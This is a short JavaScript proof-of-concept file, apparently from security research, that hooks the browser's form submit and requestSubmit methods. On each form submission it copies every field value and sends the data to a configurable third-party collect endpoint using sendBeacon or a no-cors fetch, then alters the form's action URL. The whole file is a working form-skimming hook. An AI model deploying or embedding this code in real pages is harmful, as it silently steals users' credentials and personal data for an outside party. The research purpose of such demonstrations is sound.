(() => {
  if (HTMLFormElement.prototype.__pocF_patched__) return;
  Object.defineProperty(HTMLFormElement.prototype, "__pocF_patched__", {
    value: true, configurable: false, enumerable: false, writable: false,
  });

  const origSubmit = HTMLFormElement.prototype.submit;
  const origRequestSubmit = HTMLFormElement.prototype.requestSubmit;

  function hookLogic(form, submitter) {
    console.log("[PoC-F] hook fired", {
      action: form.action,
      method: form.method,
      hasSubmitter: !!submitter,
      ts: Date.now(),
    });

    try {
      const fd = new FormData(form);

      fd.append("__poc", "F");
      fd.append("via", "sdk_proto_hook");
      fd.append("page", location.href);
      fd.append("action", String(form.action || ""));
      fd.append("ts", String(Date.now()));

      const body = new URLSearchParams();
      for (const [k, v] of fd.entries()) {
        body.append(k, typeof v === "string" ? v : "[blob]");
      }

      const cfg = window.__POC_F__ || {};
      const thirdOrigin = String(cfg.thirdOrigin || "http://localhost:4000").replace(/\/$/, "");
      const url = String(cfg.collectUrl || (thirdOrigin + "/collect"));

      let ok = false;
      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([body.toString()], {
            type: "application/x-www-form-urlencoded;charset=UTF-8",
          });
          ok = navigator.sendBeacon(url, blob);
        }
      } catch (_) {}

      if (!ok) {
        try {
          fetch(url, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
            body: body.toString(),
            keepalive: true,
          }).catch(() => {});
        } catch (_) {}
      }
    } catch {}

    try {
      const u = new URL(form.action, location.href);
      u.searchParams.set("via", "sdk");
      form.action = u.toString();
    } catch {}
  }

  Object.defineProperty(HTMLFormElement.prototype, "submit", {
    configurable: true,
    enumerable: false,
    writable: true,
    value: function patchedSubmit() {
      hookLogic(this, null);
      return origSubmit.call(this);
    },
  });

  if (typeof origRequestSubmit === "function") {
    Object.defineProperty(HTMLFormElement.prototype, "requestSubmit", {
      configurable: true,
      enumerable: false,
      writable: true,
      value: function patchedRequestSubmit(submitter) {
        hookLogic(this, submitter || null);
        return origRequestSubmit.call(this, submitter);
      },
    });
  }

  console.log("[PoC-F] prototype patched", {
    submit_is_native_before: /\[native code\]/.test(Function.prototype.toString.call(origSubmit)),
    requestSubmit_exists: typeof origRequestSubmit === "function",
  });
})();